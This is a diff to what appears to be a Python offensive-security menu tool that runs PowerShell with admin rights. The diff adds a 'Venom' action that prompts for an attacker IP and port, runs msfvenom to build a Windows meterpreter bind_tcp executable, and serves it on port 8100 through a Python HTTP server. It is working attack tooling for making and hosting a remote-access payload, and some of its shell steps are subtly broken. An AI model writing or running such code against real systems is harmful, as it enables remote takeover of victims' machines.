@@ -79,12 +79,15 @@ def run_ps(command):
 permapath = r'[Environment]::SetEnvironmentVariable("PATH", $env:PATH + ";C:\Windows\System32\OpenSSH", [System.EnvironmentVariableTarget]::Machine)'
 run_ps(permapath)
 
+#define powershell path
+pspath = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
+
 print(Fore.YELLOW + "!!!THIS PROGRAM IS NEEDED TO "+ Fore.RED + "RUN VIA CMD WITH ADMIN PRIVILEGES " + Fore.YELLOW + "TO RUN PROPERLY!!!")
 sleep(4)
 
-#scanverify = if you dont understand go to action 'scan', it verifies if the scan was initiated first
+#scanverify = if you dont understand go to action 0, it verifies if the scan was initiated first
 scanverify = "no"
-
+#ask for password to start the program else exit
 
 logging.info(f"Program accessed with correct password")
 
@@ -101,7 +104,7 @@ print(Fore.RED + ascii_art)
 sleep(2)
 print(" ")
 
-
+#ask to scan the machine whilst if "y" then gather system information else if "n" ask to continue else exit
 print("Welcome, ")
 while True:
     print("Choose your action: ")
@@ -146,7 +149,7 @@ while True:
     print_line()
     sleep(0.1)
     print("")
-    action = input(Fore.YELLOW+"M0L€> " + Fore.WHITE+"")
+    action = input("M0L€> " + "")
     cls()
 
     
@@ -955,6 +958,33 @@ while True:
 #
 #
 #
+
+    if action == "Venom":
+        isvenomgenerated=input("Did you already generate the payload with venom? y/n: ")
+        if isvenomgenerated == "n":
+            logging.info(f"Chosen action Venom to create a malicious payload")
+            venomcredip=input("Enter attacker IP: ")
+            venomcredport=input("Enter attacker port: ")
+            venomcommand='msfvenom -p windows/meterpreter/bind_tcp LHOST=' + venomcredip + ' LPORT=' + venomcredport + ' -f exe -o payload.exe'
+            os.system(venomcommand)
+            print("Payload generated as payload.exe")
+            sleep(1)
+            os.system("mkdir VenomPayload")
+            os.system("mv payload.exe VenomPayload")
+            os.system("cd VenomPayload")
+            os.system("python3 -m http.server 8100 --bind")
+            
+        else:
+            input("Put your payload.exe file in the VenomPayload folder and press Enter to continue...")
+            logging.info(f"Chosen action Venom to host already generated payload")
+            os.system("cd VenomPayload")
+            os.system("python3 -m http.server 8100 --bind")
+            print("Hosting payload on port 8100")    
+
+        sleep(2)
+        input("Press Enter to continue...")
+
+    
    #Action exit = exiting the program
     if action == "exit":
         logging.info(f"Chosen action PassExport to exit the program")
